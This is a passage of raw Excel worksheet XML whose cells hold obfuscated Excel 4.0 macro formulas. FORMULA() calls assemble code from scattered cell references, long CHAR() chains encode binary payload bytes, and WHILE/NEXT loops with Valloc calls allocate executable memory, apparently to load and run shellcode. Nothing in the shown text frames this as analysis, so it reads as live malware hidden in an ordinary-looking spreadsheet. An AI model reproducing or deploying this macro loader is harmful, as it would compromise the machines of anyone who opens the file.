&amp;CHAR(97)&amp;CHAR(33)&amp;CHAR(212)&amp;CHAR(194)&amp;CHAR(166)&amp;CHAR(229)&amp;CHAR(149)&amp;CHAR(32)&amp;CHAR(16)&amp;CHAR(234)&amp;CHAR(118)&amp;CHAR(140)&amp;CHAR(158)&amp;CHAR(22)&amp;CHAR(48)&amp;CHAR(255)&amp;CHAR(111)&amp;CHAR(107)&amp;CHAR(235)&amp;CHAR(213)&amp;CHAR(110)&amp;CHAR(153)&amp;CHAR(111)&amp;CHAR(69)&amp;CHAR(101)</f>
        <v>®_x0014_…¥™öb|_x0006__x0005_×Õ°¯4›Éô %‰eÐŸ—’Lû¸_x000F_nÝ|µ=&lt;‰½À›1_x001B_&lt;Æ_x001F__x0008_áãºXÎ!¬ê_x0018_VQ-y6æ/‚myÆƒ£ÃP_x001C_·æö«_x0017_[™œ5_Š´ò=Ê&gt;¥]_x001F_Ô_x000E_Æ±Zsð"_x001C_~8É›_x0006_Z_x0018_1Bù¹|©_x0006_+àÓÂâ6=UÐ‹\ø†ù÷hY_x0008_Ò^C_x001A_°Äç¨Ö_x001F__x001A_oRü_x0007_L8ÜŽú_x0014_¤ˆî_x000E__x0019__x0008_q-¡Ï!_x001E_†ÑÂ gÒ‘Æt_x0014_òoðdw296¢éTê	ÒeBf$ÖÕ©¾¤AP¥iß^_x000E__x000F_ú[è6À;Ù "vÖ–¥§üý˜¹Þa!ÔÂ¦å• _x0010_êvŒž_x0016_0ÿokëÕn™oEe</v>
      </c>
      <c r="DG23" t="str">
        <f>CHAR(222)&amp;CHAR(150)&amp;CHAR(25)&amp;CHAR(207)&amp;CHAR(144)&amp;CHAR(13)&amp;CHAR(153)&amp;CHAR(92)&amp;CHAR(214)&amp;CHAR(28)</f>
        <v>Þ–_x0019_Ï_x000D_™\Ö_x001C_</v>
      </c>
      <c r="DH23" t="s">
        <v>22</v>
      </c>
      <c r="DJ23" t="b">
        <f>WHILE($DJ$22=0)</f>
        <v>1</v>
      </c>
    </row>
    <row r="24" spans="109:114" x14ac:dyDescent="0.45">
      <c r="DE24" t="b">
        <f>FORMULA(DH65&amp;DH45&amp;DH31&amp;DH46&amp;DH71&amp;DH48&amp;DH27&amp;DH38&amp;DH47&amp;DH31&amp;DH66&amp;DH44&amp;DH55&amp;DH55&amp;DH29&amp;DH54&amp;DH54&amp;DH57&amp;DH76&amp;DH48&amp;DH1&amp;DH12&amp;DH12&amp;DH15&amp;DH3&amp;DH66&amp;DH44&amp;DH55&amp;DH54&amp;DH29&amp;DH54&amp;DH54&amp;DH57&amp;DH76&amp;DH59&amp;DH58&amp;DH58&amp;DH56&amp;DH59&amp;DH76&amp;DH54&amp;DH55&amp;DH55&amp;DH61&amp;DH61&amp;DH76&amp;DH59&amp;DH57&amp;DH67&amp;DH67,DJ24)</f>
        <v>1</v>
      </c>
      <c r="DF24" t="str">
        <f>CHAR(126)&amp;CHAR(112)&amp;CHAR(58)&amp;CHAR(43)&amp;CHAR(184)&amp;CHAR(247)&amp;CHAR(59)&amp;CHAR(201)&amp;CHAR(173)&amp;CHAR(230)&amp;CHAR(221)&amp;CHAR(219)&amp;CHAR(248)&amp;CHAR(16)&amp;CHAR(13)&amp;CHAR(222)&amp;CHAR(44)&amp;CHAR(61)&amp;CHAR(174)&amp;CHAR(74)&amp;CHAR(193)&amp;CHAR(215)&amp;CHAR(147)&amp;CHAR(251)&amp;CHAR(239)&amp;CHAR(169)&amp;CHAR(184)&amp;CHAR(1)&amp;CHAR(189)&amp;CHAR(47)&amp;CHAR(137)&amp;CHAR(125)&amp;CHAR(17)&amp;CHAR(10)&amp;CHAR(123)&amp;CHAR(163)&amp;CHAR(176)&amp;CHAR(177)&amp;CHAR(224)&amp;CHAR(13)&amp;CHAR(6)&amp;CHAR(244)&amp;CHAR(255)&amp;CHAR(78)&amp;CHAR(117)&amp;CHAR(220)&amp;CHAR(226)&amp;CHAR(212)&amp;CHAR(81)&amp;CHAR(61)&amp;CHAR(86)&amp;CHAR(28)&amp;CHAR(99)&amp;CHAR(244)&amp;CHAR(44)&amp;CHAR(108)&amp;CHAR(194)&amp;CHAR(241)&amp;CHAR(102)&amp;CHAR(69)&amp;CHAR(248)&amp;CHAR(238)&amp;CHAR(52)&amp;CHAR(197)&amp;CHAR(68)&amp;CHAR(197)&amp;CHAR(81)&amp;CHAR(184)&amp;CHAR(174)&amp;CHAR(67)&amp;CHAR(135)&amp;CHAR(224)&amp;CHAR(231)&amp;CHAR(54)&amp;CHAR(67)&amp;CHAR(228)&amp;CHAR(11)&amp;CHAR(165)&amp;CHAR(144)&amp;CHAR(49)&amp;CHAR(254)&amp;CHAR(166)&amp;CHAR(192)&amp;CHAR(31)&amp;CHAR(216)&amp;CHAR(84)&amp;CHAR(105)&amp;CHAR(63)&amp;CHAR(247)&amp;CHAR(247)&amp;CHAR(55)&amp;CHAR(216)&amp;CHAR(93)&amp;CHAR(116)&amp;CHAR(210)&amp;CHAR(238)&amp;CHAR(123)&amp;CHAR(2)&amp;CHAR(107)&amp;CHAR(121)&amp;CHAR(118)&amp;CHAR(131)&amp;CHAR(79)&amp;CHAR(232)&amp;CHAR(250)&amp;CHAR(62)&amp;CHAR(227)&amp;CHAR(208)&amp;CHAR(13)&amp;CHAR(132)&amp;CHAR(121)&amp;CHAR(251)&amp;CHAR(19)&amp;CHAR(128)&amp;CHAR(142)&amp;CHAR(58)&amp;CHAR(58)&amp;CHAR(162)&amp;CHAR(206)&amp;CHAR(143)&amp;CHAR(149)&amp;CHAR(145)&amp;CHAR(147)&amp;CHAR(123)&amp;CHAR(207)&amp;CHAR(130)&amp;CHAR(243)&amp;CHAR(75)&amp;CHAR(225)&amp;CHAR(193)&amp;CHAR(95)&amp;CHAR(16)&amp;CHAR(119)&amp;CHAR(166)&amp;CHAR(252)&amp;CHAR(165)&amp;CHAR(37)&amp;CHAR(72)&amp;CHAR(217)&amp;CHAR(218)&amp;CHAR(74)&amp;CHAR(135)&amp;CHAR(144)&amp;CHAR(213)&amp;CHAR(65)&amp;CHAR(56)&amp;CHAR(181)&amp;CHAR(141)&amp;CHAR(223)&amp;CHAR(13)&amp;CHAR(116)&amp;CHAR(4)&amp;CHAR(16)&amp;CHAR(139)&amp;CHAR(166)&amp;CHAR(150)&amp;CHAR(63)&amp;CHAR(190)&amp;CHAR(198)&amp;CHAR(100)&amp;CHAR(112)&amp;CHAR(62)&amp;CHAR(52)&amp;CHAR(156)&amp;CHAR(217)&amp;CHAR(82)&amp;CHAR(151)&amp;CHAR(190)&amp;CHAR(151)&amp;CHAR(18)&amp;CHAR(138)&amp;CHAR(88)&amp;CHAR(77)&amp;CHAR(60)&amp;CHAR(35)&amp;CHAR(237)&amp;CHAR(96)&amp;CHAR(68)&amp;CHAR(202)&amp;CHAR(7)&amp;CHAR(123)&amp;CHAR(253)&amp;CHAR(233)&amp;CHAR(159)&amp;CHAR(186)&amp;CHAR(197)&amp;CHAR(172)&amp;CHAR(34)&amp;CHAR(99)&amp;CHAR(119)&amp;CHAR(91)&amp;CHAR(100)&amp;CHAR(140)&amp;CHAR(87)&amp;CHAR(143)&amp;CHAR(145)&amp;CHAR(98)&amp;CHAR(31)&amp;CHAR(177)&amp;CHAR(107)&amp;CHAR(50)&amp;CHAR(96)&amp;CHAR(167)&amp;CHAR(208)&amp;CHAR(198)&amp;CHAR(206)&amp;CHAR(234)&amp;CHAR(18)&amp;CHAR(114)&amp;CHAR(103)&amp;CHAR(186)&amp;CHAR(185)&amp;CHAR(118)&amp;CHAR(23)&amp;CHAR(50)&amp;CHAR(129)&amp;CHAR(163)&amp;CHAR(49)&amp;CHAR(121)&amp;CHAR(230)&amp;CHAR(163)&amp;CHAR(130)&amp;CHAR(93)&amp;CHAR(97)&amp;CHAR(136)&amp;CHAR(56)&amp;CHAR(46)&amp;CHAR(147)&amp;CHAR(32)&amp;CHAR(4)&amp;CHAR(190)&amp;CHAR(31)&amp;CHAR(6)&amp;CHAR(97)&amp;CHAR(185)&amp;CHAR(203)&amp;CHAR(209)&amp;CHAR(35)&amp;CHAR(234)&amp;CHAR(118)&amp;CHAR(95)&amp;CHAR(73)&amp;CHAR(27)&amp;CHAR(12)&amp;CHAR(162)&amp;CHAR(67)&amp;CHAR(22)&amp;CHAR(76)&amp;CHAR(246)&amp;CHAR(157)&amp;CHAR(170)&amp;CHAR(212)&amp;CHAR(173)&amp;CHAR(195)&amp;CHAR(228)</f>
        <v>~p:+¸÷;É­æÝÛø_x0010__x000D_Þ,=®JÁ×“ûï©¸_x0001_½/‰}_x0011_
{£°±à_x000D__x0006_ôÿNuÜâÔQ=V_x001C_cô,lÂñfEøî4ÅDÅQ¸®C‡àç6Cä_x000B_¥1þ¦À_x001F_ØTi?÷÷7Ø]tÒî{_x0002_kyvƒOèú&gt;ãÐ_x000D_„yû_x0013_€Ž::¢Î•‘“{Ï‚óKáÁ__x0010_w¦ü¥%HÙÚJ‡ÕA8µß_x000D_t_x0004__x0010_‹¦–?¾Ædp&gt;4œÙR—¾—_x0012_ŠXM&lt;#í`DÊ_x0007_{ýéŸºÅ¬"cw[dŒW‘b_x001F_±k2`§ÐÆÎê_x0012_rgº¹v_x0017_2£1yæ£‚]aˆ8.“ _x0004_¾_x001F__x0006_a¹ËÑ#êv_I_x001B__x000C_¢C_x0016_LöªÔ­Ãä</v>
      </c>
      <c r="DG24" t="str">
        <f>CHAR(136)&amp;CHAR(40)&amp;CHAR(28)&amp;CHAR(203)&amp;CHAR(71)&amp;CHAR(88)&amp;CHAR(21)&amp;CHAR(92)&amp;CHAR(217)&amp;CHAR(235)</f>
        <v>ˆ(_x001C_ËGX_x0015_\Ùë</v>
      </c>
      <c r="DH24" t="s">
        <v>23</v>
      </c>
      <c r="DJ24" t="b">
        <f>SET.VALUE($DJ$22,Valloc($DJ$21,65536,12288,64))</f>
        <v>1</v>
      </c>
    </row>
    <row r="25" spans="109:114" x14ac:dyDescent="0.45">
      <c r="DE25" t="b">
        <f>FORMULA(DH65&amp;DH45&amp;DH31&amp;DH46&amp;DH71&amp;DH48&amp;DH27&amp;DH38&amp;DH47&amp;DH31&amp;DH66&amp;DH44&amp;DH55&amp;DH54&amp;DH29&amp;DH54&amp;DH54&amp;DH57&amp;DH76&amp;DH44&amp;DH55&amp;DH54&amp;DH29&amp;DH54&amp;DH54&amp;DH57&amp;DH72&amp;DH55&amp;DH59&amp;DH55&amp;DH54&amp;DH57&amp;DH57&amp;DH67,DJ25)</f>
        <v>1</v>
      </c>
      <c r="DF25" t="str">
        <f>CHAR(128)&amp;CHAR(145)&amp;CHAR(70)&amp;CHAR(74)&amp;CHAR(181)&amp;CHAR(131)&amp;CHAR(210)&amp;CHAR(132)&amp;CHAR(205)&amp;CHAR(134)&amp;CHAR(99)&amp;CHAR(127)&amp;CHAR(53)&amp;CHAR(36)&amp;CHAR(248)&amp;CHAR(80)&amp;CHAR(121)&amp;CHAR(129)&amp;CHAR(255)&amp;CHAR(112)&amp;CHAR(61)&amp;CHAR(94)&amp;CHAR(21)&amp;CHAR(142)&amp;CHAR(192)&amp;CHAR(122)&amp;CHAR(122)&amp;CHAR(116)&amp;CHAR(54)&amp;CHAR(223)&amp;CHAR(53)&amp;CHAR(118)&amp;CHAR(88)&amp;CHAR(179)&amp;CHAR(50)&amp;CHAR(2)&amp;CHAR(160)&amp;CHAR(225)&amp;CHAR(75)&amp;CHAR(78)&amp;CHAR(56)&amp;CHAR(150)&amp;CHAR(137)&amp;CHAR(65)&amp;CHAR(116)&amp;CHAR(161)&amp;CHAR(183)&amp;CHAR(76)&amp;CHAR(209)&amp;CHAR(227)&amp;CHAR(168)&amp;CHAR(233)&amp;CHAR(244)&amp;CHAR(147)&amp;CHAR(161)&amp;CHAR(198)&amp;CHAR(214)&amp;CHAR(109)&amp;CHAR(203)&amp;CHAR(197)&amp;CHAR(16)&amp;CHAR(119)&amp;CHAR(75)&amp;CHAR(249)&amp;CHAR(224)&amp;CHAR(165)&amp;CHAR(131)&amp;CHAR(14)&amp;CHAR(47)&amp;CHAR(179)&amp;CHAR(189)&amp;CHAR(95)&amp;CHAR(130)&amp;CHAR(30)&amp;CHAR(230)&amp;CHAR(167)&amp;CHAR(63)&amp;CHAR(132)&amp;CHAR(76)&amp;CHAR(6)&amp;CHAR(158)&amp;CHAR(187)&amp;CHAR(230)&amp;CHAR(207)&amp;CHAR(154)&amp;CHAR(118)&amp;CHAR(195)&amp;CHAR(47)&amp;CHAR(126)&amp;CHAR(121)&amp;CHAR(226)&amp;CHAR(138)&amp;CHAR(16)&amp;CHAR(164)&amp;CHAR(224)&amp;CHAR(27)&amp;CHAR(236)&amp;CHAR(17)&amp;CHAR(123)&amp;CHAR(201)&amp;CHAR(62)&amp;CHAR(7)&amp;CHAR(121)&amp;CHAR(62)&amp;CHAR(130)&amp;CHAR(53)&amp;CHAR(106)&amp;CHAR(131)&amp;CHAR(84)&amp;CHAR(173)&amp;CHAR(213)&amp;CHAR(116)&amp;CHAR(104)&amp;CHAR(37)&amp;CHAR(62)&amp;CHAR(211)&amp;CHAR(151)&amp;CHAR(141)&amp;CHAR(138)&amp;CHAR(62)&amp;CHAR(220)&amp;CHAR(202)&amp;CHAR(132)&amp;CHAR(205)&amp;CHAR(226)&amp;CHAR(106)&amp;CHAR(151)&amp;CHAR(93)&amp;CHAR(228)&amp;CHAR(170)&amp;CHAR(101)&amp;CHAR(167)&amp;CHAR(20)&amp;CHAR(86)&amp;CHAR(247)&amp;CHAR(108)&amp;CHAR(232)&amp;CHAR(247)&amp;CHAR(209)&amp;CHAR(189)&amp;CHAR(89)&amp;CHAR(225)&amp;CHAR(10)&amp;CHAR(232)&amp;CHAR(74)&amp;CHAR(220)&amp;CHAR(45)&amp;CHAR(231)&amp;CHAR(225)&amp;CHAR(51)&amp;CHAR(159)&amp;CHAR(144)&amp;CHAR(239)&amp;CHAR(47)&amp;CHAR(200)&amp;CHAR(236)&amp;CHAR(39)&amp;CHAR(16)&amp;CHAR(179)&amp;CHAR(139)&amp;CHAR(152)&amp;CHAR(109)&amp;CHAR(128)&amp;CHAR(22)&amp;CHAR(180)&amp;CHAR(37)&amp;CHAR(250)&amp;CHAR(136)&amp;CHAR(134)&amp;CHAR(10)&amp;CHAR(35)&amp;CHAR(14)&amp;CHAR(179)&amp;CHAR(117)&amp;CHAR(120)&amp;CHAR(222)&amp;CHAR(125)&amp;CHAR(192)&amp;CHAR(248)&amp;CHAR(198)&amp;CHAR(48)&amp;CHAR(226)&amp;CHAR(145)&amp;CHAR(5)&amp;CHAR(36)&amp;CHAR(128)&amp;CHAR(248)&amp;CHAR(238)&amp;CHAR(47)&amp;CHAR(101)&amp;CHAR(49)&amp;CHAR(74)&amp;CHAR(163)&amp;CHAR(208)&amp;CHAR(124)&amp;CHAR(37)&amp;CHAR(49)&amp;CHAR(198)&amp;CHAR(161)&amp;CHAR(86)&amp;CHAR(26)&amp;CHAR(12)&amp;CHAR(251)&amp;CHAR(60)&amp;CHAR(42)&amp;CHAR(22)&amp;CHAR(14)&amp;CHAR(95)&amp;CHAR(199)&amp;CHAR(68)&amp;CHAR(55)&amp;CHAR(100)&amp;CHAR(187)&amp;CHAR(213)&amp;CHAR(69)&amp;CHAR(175)&amp;CHAR(53)&amp;CHAR(89)&amp;CHAR(50)&amp;CHAR(92)&amp;CHAR(241)&amp;CHAR(86)&amp;CHAR(207)&amp;CHAR(158)&amp;CHAR(191)&amp;CHAR(209)&amp;CHAR(20)&amp;CHAR(195)&amp;CHAR(253)&amp;CHAR(72)&amp;CHAR(228)&amp;CHAR(112)&amp;CHAR(75)&amp;CHAR(79)&amp;CHAR(15)&amp;CHAR(147)&amp;CHAR(1)&amp;CHAR(9)&amp;CHAR(212)&amp;CHAR(198)&amp;CHAR(21)&amp;CHAR(215)&amp;CHAR(44)&amp;CHAR(210)&amp;CHAR(232)&amp;CHAR(88)&amp;CHAR(161)&amp;CHAR(174)&amp;CHAR(143)&amp;CHAR(226)&amp;CHAR(144)&amp;CHAR(55)&amp;CHAR(189)&amp;CHAR(191)&amp;CHAR(122)</f>
        <v>€‘FJµƒÒ„Í†c5$øPyÿp=^_x0015_ŽÀzzt6ß5vX³2_x0002_ áKN8–‰At¡·LÑã¨éô“¡ÆÖmËÅ_x0010_wKùà¥ƒ_x000E_/³½_‚_x001E_æ§?„L_x0006_ž»æÏšvÃ/~yâŠ_x0010_¤à_x001B_ì_x0011_{É&gt;_x0007_y&gt;‚5jƒT­Õth%&gt;Ó—Š&gt;ÜÊ„Íâj—]äªe§_x0014_V÷lè÷Ñ½Yá
èJÜ-çá3Ÿï/Èì'_x0010_³‹˜m€_x0016_´%úˆ†
#_x000E_³uxÞ}ÀøÆ0â‘_x0005_$€øî/e1J£Ð|%1Æ¡V_x001A__x000C_û&lt;*_x0016__x000E__ÇD7d»ÕE¯5Y2\ñVÏž¿Ñ_x0014_ÃýHäpKO_x000F_“_x0001_	ÔÆ_x0015_×,ÒèX¡®â7½¿z</v>
      </c>
      <c r="DG25" t="str">
        <f>CHAR(241)&amp;CHAR(206)&amp;CHAR(203)&amp;CHAR(163)&amp;CHAR(215)&amp;CHAR(148)&amp;CHAR(132)&amp;CHAR(113)&amp;CHAR(160)&amp;CHAR(150)</f>
        <v>ñÎË£×”„q –</v>
      </c>
      <c r="DH25" t="s">
        <v>24</v>
      </c>
      <c r="DJ25" t="b">
        <f>SET.VALUE($DJ$21,$DJ$21+262144)</f>
        <v>1</v>
      </c>
    </row>
    <row r="26" spans="109:114" x14ac:dyDescent="0.45">
      <c r="DE26" t="b">
        <f>FORMULA(DH65&amp;DH40&amp;DH31&amp;DH50&amp;DH46&amp;DH66&amp;DH67,DJ26)</f>
        <v>1</v>
      </c>
      <c r="DF26" t="str">
        <f>CHAR(214)&amp;CHAR(6)&amp;CHAR(134)&amp;CHAR(6)&amp;CHAR(219)&amp;CHAR(160)&amp;CHAR(167)&amp;CHAR(145)&amp;CHAR(255)&amp;CHAR(86)&amp;CHAR(113)&amp;CHAR(209)&amp;CHAR(253)&amp;CHAR(203)&amp;CHAR(234)&amp;CHAR(81)&amp;CHAR(136)&amp;CHAR(49)&amp;CHAR(150)&amp;CHAR(86)&amp;CHAR(208)&amp;CHAR(142)&amp;CHAR(195)&amp;CHAR(2)&amp;CHAR(108)&amp;CHAR(10)&amp;CHAR(223)&amp;CHAR(72)&amp;CHAR(116)&amp;CHAR(76)&amp;CHAR(37)&amp;CHAR(55)&amp;CHAR(103)&amp;CHAR(98)&amp;CHAR(198)&amp;CHAR(83)&amp;CHAR(43)&amp;CHAR(241)&amp;CHAR(180)&amp;CHAR(20)&amp;CHAR(97)&amp;CHAR(158)&amp;CHAR(247)&amp;CHAR(158)&amp;CHAR(42)&amp;CHAR(208)&amp;CHAR(254)&amp;CHAR(78)&amp;CHAR(73)&amp;CHAR(236)&amp;CHAR(167)&amp;CHAR(187)&amp;CHAR(191)&amp;CHAR(63)&amp;CHAR(219)&amp;CHAR(35)&amp;CHAR(4)&amp;CHAR(88)&amp;CHAR(11)&amp;CHAR(54)&amp;CHAR(190)&amp;CHAR(72)&amp;CHAR(2)&amp;CHAR(94)&amp;CHAR(157)&amp;CHAR(158)&amp;CHAR(20)&amp;CHAR(179)&amp;CHAR(110)&amp;CHAR(147)&amp;CHAR(43)&amp;CHAR(47)&amp;CHAR(134)&amp;CHAR(72)&amp;CHAR(124)&amp;CHAR(4)&amp;CHAR(42)&amp;CHAR(248)&amp;CHAR(180)&amp;CHAR(93)&amp;CHAR(164)&amp;CHAR(35)&amp;CHAR(198)&amp;CHAR(152)&amp;CHAR(188)&amp;CHAR(122)&amp;CHAR(181)&amp;CHAR(242)&amp;CHAR(30)&amp;CHAR(150)&amp;CHAR(196)&amp;CHAR(44)&amp;CHAR(49)&amp;CHAR(238)&amp;CHAR(4)&amp;CHAR(37)&amp;CHAR(31)&amp;CHAR(156)&amp;CHAR(167)&amp;CHAR(137)&amp;CHAR(120)&amp;CHAR(253)&amp;CHAR(210)&amp;CHAR(171)&amp;CHAR(6)&amp;CHAR(31)&amp;CHAR(214)&amp;CHAR(20)&amp;CHAR(5)&amp;CHAR(188)&amp;CHAR(124)&amp;CHAR(128)&amp;CHAR(48)&amp;CHAR(165)&amp;CHAR(204)&amp;CHAR(134)&amp;CHAR(43)&amp;CHAR(173)&amp;CHAR(162)&amp;CHAR(195)&amp;CHAR(158)&amp;CHAR(136)&amp;CHAR(242)&amp;CHAR(253)&amp;CHAR(206)&amp;CHAR(118)&amp;CHAR(116)&amp;CHAR(124)&amp;CHAR(210)&amp;CHAR(107)&amp;CHAR(225)&amp;CHAR(38)&amp;CHAR(255)&amp;CHAR(218)&amp;CHAR(157)&amp;CHAR(94)&amp;CHAR(117)&amp;CHAR(33)&amp;CHAR(242)&amp;CHAR(117)&amp;CHAR(85)&amp;CHAR(43)&amp;CHAR(157)&amp;CHAR(163)&amp;CHAR(73)&amp;CHAR(224)&amp;CHAR(124)&amp;CHAR(7)&amp;CHAR(10)&amp;CHAR(143)&amp;CHAR(152)&amp;CHAR(214)&amp;CHAR(228)&amp;CHAR(97)&amp;CHAR(129)&amp;CHAR(178)&amp;CHAR(193)&amp;CHAR(45)&amp;CHAR(199)&amp;CHAR(130)&amp;CHAR(200)&amp;CHAR(120)&amp;CHAR(50)&amp;CHAR(97)&amp;CHAR(84)&amp;CHAR(188)&amp;CHAR(183)&amp;CHAR(254)&amp;CHAR(40)&amp;CHAR(171)&amp;CHAR(167)&amp;CHAR(185)&amp;CHAR(50)&amp;CHAR(35)&amp;CHAR(179)&amp;CHAR(68)&amp;CHAR(103)&amp;CHAR(80)&amp;CHAR(21)&amp;CHAR(43)&amp;CHAR(160)&amp;CHAR(35)&amp;CHAR(25)&amp;CHAR(200)&amp;CHAR(118)&amp;CHAR(94)&amp;CHAR(184)&amp;CHAR(13)&amp;CHAR(125)&amp;CHAR(160)&amp;CHAR(204)&amp;CHAR(64)&amp;CHAR(226)&amp;CHAR(216)&amp;CHAR(122)&amp;CHAR(21)&amp;CHAR(18)&amp;CHAR(255)&amp;CHAR(172)&amp;CHAR(158)&amp;CHAR(22)&amp;CHAR(56)&amp;CHAR(94)&amp;CHAR(204)&amp;CHAR(98)&amp;CHAR(23)&amp;CHAR(53)&amp;CHAR(242)&amp;CHAR(207)&amp;CHAR(91)&amp;CHAR(117)&amp;CHAR(75)&amp;CHAR(75)&amp;CHAR(11)&amp;CHAR(55)&amp;CHAR(146)&amp;CHAR(113)&amp;CHAR(37)&amp;CHAR(14)&amp;CHAR(31)&amp;CHAR(159)&amp;CHAR(159)&amp;CHAR(88)&amp;CHAR(195)&amp;CHAR(158)&amp;CHAR(233)&amp;CHAR(37)&amp;CHAR(20)&amp;CHAR(165)&amp;CHAR(117)&amp;CHAR(49)&amp;CHAR(201)&amp;CHAR(200)&amp;CHAR(132)&amp;CHAR(124)&amp;CHAR(93)&amp;CHAR(224)&amp;CHAR(157)&amp;CHAR(94)&amp;CHAR(250)&amp;CHAR(158)&amp;CHAR(81)&amp;CHAR(71)&amp;CHAR(169)&amp;CHAR(105)&amp;CHAR(105)&amp;CHAR(99)&amp;CHAR(211)&amp;CHAR(149)&amp;CHAR(189)&amp;CHAR(201)&amp;CHAR(129)&amp;CHAR(245)&amp;CHAR(11)&amp;CHAR(217)</f>
        <v>Ö_x0006_†_x0006_Û §‘ÿVqÑýËêQˆ1–VÐŽÃ_x0002_l
ßHtL%7gbÆS+ñ´_x0014_až÷ž*ÐþNIì§»¿?Û#_x0004_X_x000B_6¾H_x0002_^ž_x0014_³n“+/†H|_x0004_*ø´]¤#Æ˜¼zµò_x001E_–Ä,1î_x0004_%_x001F_œ§‰xýÒ«_x0006__x001F_Ö_x0014__x0005_¼|€0¥Ì†+­¢ÃžˆòýÎvt|Òká&amp;ÿÚ^u!òuU+£Ià|_x0007_
˜Öäa²Á-Ç‚Èx2aT¼·þ(«§¹2#³DgP_x0015_+ #_x0019_Èv^¸_x000D_} Ì@âØz_x0015__x0012_ÿ¬ž_x0016_8^Ìb_x0017_5òÏ[uKK_x000B_7’q%_x000E__x001F_ŸŸXÃžé%_x0014_¥u1ÉÈ„|]à^úžQG©iicÓ•½Éõ_x000B_Ù</v>
      </c>
      <c r="DG26" t="str">
        <f>CHAR(64)&amp;CHAR(122)&amp;CHAR(27)&amp;CHAR(221)&amp;CHAR(38)&amp;CHAR(213)&amp;CHAR(62)&amp;CHAR(115)&amp;CHAR(64)&amp;CHAR(123)</f>
        <v>@z_x001B_Ý&amp;Õ&gt;s@{</v>
      </c>
      <c r="DH26" t="s">
        <v>25</v>
      </c>
      <c r="DJ26" t="b">
        <f>NEXT()</f>
        <v>1</v>
      </c>
    </row>
    <row r="27" spans="109:114" x14ac:dyDescent="0.45">
      <c r="DE27" t="b">
        <f>FORMULA(DH65&amp;DH44&amp;DH31&amp;DH33&amp;DH35&amp;DH45&amp;DH46&amp;DH31&amp;DH44&amp;DH66&amp;DH68&amp;DH37&amp;DH5&amp;DH18&amp;DH14&amp;DH5&amp;DH12&amp;DH56&amp;DH55&amp;DH68&amp;DH76&amp;DH68&amp;DH44&amp;DH20&amp;DH12&amp;DH29&amp;DH15&amp;DH16&amp;DH25&amp;DH39&amp;DH5&amp;DH13&amp;DH15&amp;DH18&amp;DH25&amp;DH68&amp;DH76&amp;DH68&amp;DH36&amp;DH36&amp;DH29&amp;DH36&amp;DH68&amp;DH76&amp;DH68&amp;DH44&amp;DH46&amp;DH38&amp;DH68&amp;DH76&amp;DH76&amp;DH54&amp;DH76&amp;DH62&amp;DH67,DJ27)</f>
        <v>1</v>
      </c>
      <c r="DF27" t="str">
        <f>CHAR(107)&amp;CHAR(94)&amp;CHAR(117)&amp;CHAR(70)&amp;CHAR(31)&amp;CHAR(90)&amp;CHAR(144)&amp;CHAR(4)&amp;CHAR(187)&amp;CHAR(39)&amp;CHAR(244)&amp;CHAR(68)&amp;CHAR(115)&amp;CHAR(246)&amp;CHAR(50)&amp;CHAR(45)&amp;CHAR(148)&amp;CHAR(148)&amp;CHAR(33)&amp;CHAR(135)&amp;CHAR(13)&amp;CHAR(87)&amp;CHAR(79)&amp;CHAR(92)&amp;CHAR(188)&amp;CHAR(250)&amp;CHAR(143)&amp;CHAR(129)&amp;CHAR(210)&amp;CHAR(208)&amp;CHAR(252)&amp;CHAR(225)&amp;CHAR(199)&amp;CHAR(118)&amp;CHAR(214)&amp;CHAR(106)&amp;CHAR(20)&amp;CHAR(89)&amp;CHAR(16)&amp;CHAR(100)&amp;CHAR(155)&amp;CHAR(9)&amp;CHAR(107)&amp;CHAR(132)&amp;CHAR(88)&amp;CHAR(68)&amp;CHAR(204)&amp;CHAR(235)&amp;CHAR(197)&amp;CHAR(41)&amp;CHAR(226)&amp;CHAR(165)&amp;CHAR(73)&amp;CHAR(116)&amp;CHAR(248)&amp;CHAR(240)&amp;CHAR(40)&amp;CHAR(193)&amp;CHAR(78)&amp;CHAR(97)&amp;CHAR(22)&amp;CHAR(64)&amp;CHAR(76)&amp;CHAR(37)&amp;CHAR(42)&amp;CHAR(133)&amp;CHAR(71)&amp;CHAR(18)&amp;CHAR(50)&amp;CHAR(111)&amp;CHAR(232)&amp;CHAR(44)&amp;CHAR(139)&amp;CHAR(177)&amp;CHAR(176)&amp;CHAR(94)&amp;CHAR(158)&amp;CHAR(59)&amp;CHAR(185)&amp;CHAR(27)&amp;CHAR(189)&amp;CHAR(235)&amp;CHAR(15)&amp;CHAR(233)&amp;CHAR(150)&amp;CHAR(67)&amp;CHAR(2)&amp;CHAR(173)&amp;CHAR(94)&amp;CHAR(235)&amp;CHAR(164)&amp;CHAR(206)&amp;CHAR(193)&amp;CHAR(10)&amp;CHAR(180)&amp;CHAR(106)&amp;CHAR(15)&amp;CHAR(246)&amp;CHAR(181)&amp;CHAR(201)&amp;CHAR(45)&amp;CHAR(32)&amp;CHAR(145)&amp;CHAR(242)&amp;CHAR(7)&amp;CHAR(161)&amp;CHAR(173)&amp;CHAR(193)&amp;CHAR(243)&amp;CHAR(180)&amp;CHAR(218)&amp;CHAR(45)&amp;CHAR(234)&amp;CHAR(183)&amp;CHAR(250)&amp;CHAR(226)&amp;CHAR(231)&amp;CHAR(85)&amp;CHAR(37)&amp;CHAR(219)&amp;CHAR(20)&amp;CHAR(181)&amp;CHAR(58)&amp;CHAR(190)&amp;CHAR(170)&amp;CHAR(52)&amp;CHAR(73)&amp;CHAR(138)&amp;CHAR(248)&amp;CHAR(1)&amp;CHAR(76)&amp;CHAR(192)&amp;CHAR(36)&amp;CHAR(24)&amp;CHAR(189)&amp;CHAR(111)&amp;CHAR(65)&amp;CHAR(213)&amp;CHAR(195)&amp;CHAR(184)&amp;CHAR(55)&amp;CHAR(22)&amp;CHAR(47)&amp;CHAR(44)&amp;CHAR(151)&amp;CHAR(215)&amp;CHAR(19)&amp;CHAR(186)&amp;CHAR(30)&amp;CHAR(221)&amp;CHAR(132)&amp;CHAR(196)&amp;CHAR(9)&amp;CHAR(185)&amp;CHAR(252)&amp;CHAR(159)&amp;CHAR(75)&amp;CHAR(15)&amp;CHAR(168)&amp;CHAR(195)&amp;CHAR(125)&amp;CHAR(136)&amp;CHAR(111)&amp;CHAR(212)&amp;CHAR(138)&amp;CHAR(194)&amp;CHAR(78)&amp;CHAR(198)&amp;CHAR(160)&amp;CHAR(167)&amp;CHAR(187)&amp;CHAR(134)&amp;CHAR(220)&amp;CHAR(33)&amp;CHAR(129)&amp;CHAR(91)&amp;CHAR(159)&amp;CHAR(65)&amp;CHAR(157)&amp;CHAR(174)&amp;CHAR(21)&amp;CHAR(161)&amp;CHAR(150)&amp;CHAR(36)&amp;CHAR(52)&amp;CHAR(107)